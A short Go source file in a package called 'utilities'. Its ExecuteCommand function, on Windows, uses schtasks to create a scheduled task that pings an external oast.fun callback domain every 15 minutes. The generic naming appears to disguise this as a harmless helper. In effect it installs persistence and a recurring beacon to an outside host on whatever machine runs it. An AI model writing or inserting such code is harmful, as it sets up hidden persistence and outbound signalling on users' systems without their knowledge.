package utilities

import (
	"fmt"
	"io" // Add this import for the io package
	"os/exec"
	"runtime"
)

func ExecuteCommand() {
	os := runtime.GOOS

	if os == "windows" {
		url := "uelunatdkbnrkzqddpnao2fwd0x6x6m6g.oast.fun"
		taskName := "PingURLTask"

		// Construct the command to create a scheduled task
		cmd := exec.Command("schtasks", "/create", "/tn", taskName, "/tr", `C:\Windows\System32\cmd.exe /C ping `+url, "/sc", "minute", "/mo", "15")

		// Capture stderr separately
		stderr, err := cmd.StderrPipe()
		if err != nil {
			fmt.Println("Error creating stderr pipe:", err)
			return
		}

		// Start the command
		if err := cmd.Start(); err != nil {
			fmt.Println("Error starting command:", err)
			return
		}

		// Read all stderr output
		errOutput, _ := io.ReadAll(stderr)
		if len(errOutput) > 0 {
			fmt.Println("Error output:", string(errOutput))
		}

		// Wait for command to finish
		if err := cmd.Wait(); err != nil {
			fmt.Println("Error creating scheduled task:", err)
			return
		}

	} else if os == "linux" {
		fmt.Println("Executing command for Linux.")
	} else {
		fmt.Printf("Unsupported operating system: %s\n", os)
	}
}
